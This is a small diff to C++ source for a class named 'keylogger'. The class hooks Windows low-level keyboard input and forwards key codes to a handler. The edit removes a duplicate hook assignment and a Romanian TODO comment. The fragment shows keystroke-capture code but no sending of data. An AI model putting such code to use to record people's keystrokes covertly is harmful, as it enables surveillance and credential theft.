@@ -5,10 +5,8 @@ keylogger::keylogger()
     : hook(SetWindowsHookExA(WH_KEYBOARD_LL, &keylogger::lowLevelKeyboardProc, NULL, 0)),
     client(&validation_function)
 {
-    hook = SetWindowsHookEx(WH_KEYBOARD_LL, &keylogger::lowLevelKeyboardProc, NULL, 0);
 
 }
-
 keylogger::~keylogger()
 {
     if (hook != NULL)
@@ -36,7 +34,7 @@ LRESULT CALLBACK keylogger::lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARA
         transKeys.handleKeyStroke(virtualKeyCode, status);
     }
 
- // TODO: Trimitem virtualKey ul si cu state pentru downkey si togglekey
+
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
